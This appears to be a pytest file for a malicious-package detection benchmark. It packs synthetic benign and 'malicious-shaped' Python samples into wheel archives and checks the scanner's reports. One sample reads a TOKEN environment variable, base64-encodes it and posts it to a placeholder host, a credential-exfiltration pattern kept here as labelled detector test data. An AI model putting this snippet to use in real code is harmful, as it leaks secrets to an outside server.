import csv
import json
import zipfile

from scripts.omcbench_pilot import main

BENIGN = """from pathlib import Path

def read_settings(path):
    return Path(path).read_text()
"""

MALICIOUS_SHAPED = """import base64
import os
import requests

def send_secret():
    secret = os.getenv("TOKEN")
    payload = base64.b64encode(secret.encode())
    return requests.post("https://example.invalid", data=payload)
"""


def _archive(path, source):
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as handle:
        handle.writestr("package/main.py", source)


def test_synthetic_pilot_writes_aligned_metadata_only_outputs(tmp_path, capsys):
    root = tmp_path / "corpus"
    packages = root / "packages"
    results = root / "results"
    packages.mkdir(parents=True)
    results.mkdir()
    rows = []
    for index, (label, source) in enumerate(
        [
            ("benign", BENIGN),
            ("benign", BENIGN),
            ("malicious", MALICIOUS_SHAPED),
            ("malicious", MALICIOUS_SHAPED),
        ]
    ):
        name = f"sample-{index}.whl"
        _archive(packages / name, source)
        rows.append(
            {
                "folder_name": name,
                "ecosystem": "py",
                "label_true": label,
            }
        )
    with (results / "manifest.csv").open("w", encoding="utf-8", newline="") as file:
        writer = csv.DictWriter(
            file,
            fieldnames=["folder_name", "ecosystem", "label_true"],
        )
        writer.writeheader()
        writer.writerows(rows)
    output = tmp_path / "output"
    code = main(
        [
            str(root),
            "-o",
            str(output),
            "--allow-unpinned",
            "--target-fpr",
            "0.5",
            "--bootstrap",
            "20",
            "--progress-every",
            "10",
        ]
    )

    summary = json.loads(capsys.readouterr().out)
    assert code == 0
    assert summary["packages"] == 4
    assert summary["score_changed_packages"] == 2
    expected = {
        "local_flow_predictions.jsonl",
        "paired_report.json",
        "proximity_predictions.jsonl",
        "sample_audit.jsonl",
        "study.json",
    }
    assert {path.name for path in output.iterdir()} == expected
    report = json.loads((output / "paired_report.json").read_text())
    assert report["alignment"]["rows"] == 4
    study = json.loads((output / "study.json").read_text())
    assert not study["corpus"]["pinned"]
    assert study["results"]["status_counts"] == {"ok": 4}
